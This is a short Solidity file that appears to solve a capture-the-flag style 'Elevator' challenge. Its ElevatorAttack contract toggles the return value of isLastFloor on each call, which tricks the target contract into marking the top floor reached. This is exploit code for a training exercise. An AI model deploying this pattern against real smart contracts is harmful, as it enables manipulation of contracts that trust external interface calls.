// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Elevator.sol';

// the contract below will implement the logic to the function mentioned in the Building interface, 
// setting the value to fasle. Thus, comply with a if statment.

contract ElevatorAttack {
    Elevator private immutable target;
    bool public toggle = true;

    constructor (address _target){
        target = Elevator(_target);
    }

    function isLastFloor(uint) public returns (bool){
        toggle = !toggle;
        return toggle;
    }

    function setTop(uint _floor) public {
        target.goTo(_floor);
    }
}